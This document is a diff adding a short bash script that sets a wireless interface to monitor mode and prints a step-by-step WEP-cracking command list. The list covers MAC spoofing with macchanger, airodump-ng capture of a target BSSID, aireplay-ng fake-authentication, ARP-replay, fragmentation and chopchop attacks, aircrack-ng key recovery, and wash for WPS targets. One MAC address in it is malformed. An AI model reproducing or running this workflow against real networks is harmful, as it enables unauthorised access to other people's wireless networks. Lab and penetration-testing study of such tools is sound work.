@@ -1,0 +1,28 @@
+#!/bin/bash
+#-*- coding: utf-8 -*-
+#2#::.. Last edit: - Mon Jun  6 18:54:31 EDT 2016 - by: - __INDNYALL__ - ..::## #_# - VERSION=0.0.0.1 - #_# #@#060616#@# #2#
+#3#::..#####################_MAIN_#######################..::#3#
+ip link set "${NET}" up
+netreset
+airmon-ng start "${NET}"
+airodump-ng "${NET}"mon
+ANLM "Restore ${NET}mon original state?\n"
+
+if yorn; then
+	airmon-ng stop "${NET}"mon
+else
+	ANM "ip link set "${NET}"mon down\n"
+	ANM "macchanger --mac=00:11:22:33:44:55 "${NET}"mon\n"
+	ANM "ip link set "${NET}"mon up\n"
+	ANM "airodump-ng --bssid 00:09:5B:6F:64:1E -c 11 -w WEPcrack "${NET}"mon\n"
+	ANM "\n"
+	ANM "aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0\n"
+	ANM "OR aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 "${NET}"mon\n"
+	ANM
+	ANM "aireplay-ng -3 -b 00::09:58:6F:64:1E -h 00:11:22:33:44:55 "${NET}"mon\n"
+	ANM "OR aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 "${NET}"mon\n"
+	ANM "OR aireplay-ng -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 ath0\n"
+	ANM "aircrack-ng *.cap\n"
+	ANM "\n"
+	ANLM "wash -i "${NET}"mon -C\n"
+fi
